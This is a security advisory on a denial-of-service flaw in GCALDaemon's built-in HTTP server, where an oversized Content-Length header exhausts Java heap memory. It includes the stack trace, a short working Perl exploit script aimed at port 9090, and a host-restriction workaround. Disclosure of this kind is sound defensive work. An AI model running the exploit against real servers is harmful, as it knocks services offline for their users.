*** SUMMARY ***

GCALDaemon is an OS-independent Java program that offers two-way synchronization between Google Calendar and various iCalendar compatible calendar applications. GCALDaemon is primarily designed as a calendar synchronizer but it can also be used as a Gmail notifier, Address Book importer, Gmail terminal and RSS feed converter.

Sunbird/Kontact/Firefox/ThunderBird/Mozilla Calendar all share calendars over HTTP, by uploading their file via an HTTP PUT and getting/refreshing their calendar with an HTTP GET. The GCALDaemon's built-in HTTP server keeps this HTTP messages in sync with a specified Google Calendar.  An input validation flaw permits to craft an HTTP request with an abnormal content-length value; this malformed request could trigger a denial of service that arises from a Java out of memory fatal error.

*** VULNERABILITY DETAILS ***

Using a crafted HTTP request, an attacker could trigger a denial of service that arises from a java.lang.OutOfMemoryError when the Java heap space is overfilled.
In the file "org/gcaldaemon/core/http/HTTPListener.java", the GCALDaemon's built-in HTTP server parses the HTTP request and the HTTP header parameters without validation checkpoints.
In the line of code "490:org/gcaldaemon/core/http/HTTPListener.java" the "Content-Length" header parameter is used to create a new byte array; when the size of this structure is big enough, it could trigger a Java fatal error that blocks the HTTP daemon:

Exception in thread "HTTP listener" java.lang.OutOfMemoryError: Java heap space
        at org.gcaldaemon.core.http.HTTPListener.readRequest(HTTPListener.java:490)
        at org.gcaldaemon.core.http.HTTPListener.run(HTTPListener.java:167)

*** EXPLOIT ***

The provided proof-of-concept can trigger the issue.

--------------------------------------------
#!/usr/bin/perl

use strict;
use warnings;
use IO::Socket;

my $host = shift || die "Usage: $0 host [port]\n";
my $port = shift || 9090;
my $sock = new IO::Socket::INET(PeerAddr => $host, PeerPort => $port, PeerProto => 'tcp')
or die "error: $!\n";
print "GCALDaemom DoS Expoit\n";
print "Just 4 seconds...\n";
sleep 4;
$sock->send("GET / HTTP/1.1\r\n");
$sock->send("Content-Length: 1000000000\r\n\r\n");
$sock->close;
print "\n\nNo more sync!\n";
--------------------------------------------

*** FIX INFORMATION ***

This bug will be fixed in the next version of GCALDaemon.
Thanks to the GCALDaemon's developers for the great tool.

*** WORKAROUNDS ***

It should be noted that the web server has the possibility to set a group of allowed hostnames or IP addresses; the default configuration is "allow ALL".
Users may be restricted setting the allowed hosts so that remote aggressors cannot trigger this flaw.
